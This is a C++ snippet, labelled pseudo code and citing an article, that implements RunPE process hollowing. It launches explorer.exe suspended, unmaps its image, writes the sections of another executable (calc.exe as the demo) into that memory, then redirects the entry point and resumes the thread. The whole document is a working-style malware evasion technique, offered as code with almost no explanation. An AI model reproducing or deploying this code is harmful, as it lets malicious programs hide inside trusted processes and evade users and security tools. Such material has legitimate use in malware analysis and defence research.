// pseudo code Source: http://www.adlice.com/runpe-hide-code-behind-legit-process/
void RunPe( wstring const& target, wstring const& source )
{
  Pe src_pe( source );        // Parse source PE structure
  Process::CreationResults res = Process::CreateWithFlags( target, L"", CREATE_SUSPENDED, false, false ); // Start a suspended instance of target
  PCONTEXT CTX = PCONTEXT( VirtualAlloc( NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE ) );   // Allocate space for context
  CTX->ContextFlags = CONTEXT_FULL;
  //DONE up to here


  if ( GetThreadContext( res.hThread, LPCONTEXT( CTX ) ) )    // Read target context
  {
    DWORD dwImageBase;
    ReadProcessMemory( res.hProcess, LPCVOID( CTX->Ebx + 8 ), LPVOID( &dwImageBase ), 4, NULL );        // Get base address of target

    typedef LONG( WINAPI * NtUnmapViewOfSection )(HANDLE ProcessHandle, PVOID BaseAddress);
    NtUnmapViewOfSection xNtUnmapViewOfSection;
    xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
    if ( 0 == xNtUnmapViewOfSection( res.hProcess, PVOID( dwImageBase ) ) )  // Unmap target code
    {
      LPVOID pImageBase = VirtualAllocEx(res.hProcess, LPVOID(dwImageBase), src_pe.NtHeadersx86.OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);  // Realloc for source code
      if ( pImageBase )
      {
        Buffer src_headers( src_pe.NtHeadersx86.OptionalHeader.SizeOfHeaders );                 // Read source headers
        PVOID src_headers_ptr = src_pe.GetPointer( 0 );
        if ( src_pe.ReadMemory( src_headers.Data(), src_headers_ptr, src_headers.Size() ) )
        {
          if ( WriteProcessMemory(res.hProcess, pImageBase, src_headers.Data(), src_headers.Size(), NULL) )   // Write source headers
          {
            bool success = true;
            for (u_int i = 0; i < src_pe.sections.size(); i++)     // Write all sections
            {
              // Get pointer on section and copy the content
              Buffer src_section( src_pe.sections.at( i ).SizeOfRawData );
              LPVOID src_section_ptr = src_pe.GetPointer( src_pe.sections.at( i ).PointerToRawData );
              success &= src_pe.ReadMemory( src_section.Data(), src_section_ptr, src_section.Size() );

              // Write content to target
              success &= WriteProcessMemory(res.hProcess, LPVOID(DWORD(pImageBase) + src_pe.sections.at( i ).VirtualAddress), src_section.Data(), src_section.Size(), NULL);
            }

            if ( success )
            {
              WriteProcessMemory( res.hProcess, LPVOID( CTX->Ebx + 8 ), LPVOID( &pImageBase), sizeof(LPVOID), NULL );      // Rewrite image base
              CTX->Eax = DWORD( pImageBase ) + src_pe.NtHeadersx86.OptionalHeader.AddressOfEntryPoint;        // Rewrite entry point
              SetThreadContext( res.hThread, LPCONTEXT( CTX ) );                                              // Set thread context
              ResumeThread( res.hThread );                                                                    // Resume main thread
            }
          }
        }
      }
    }
  }

  if ( res.hProcess) CloseHandle( res.hProcess );
  if ( res.hThread ) CloseHandle( res.hThread );


}

RunPe( L"C:\\windows\\explorer.exe", L"C:\\windows\\system32\\calc.exe" );
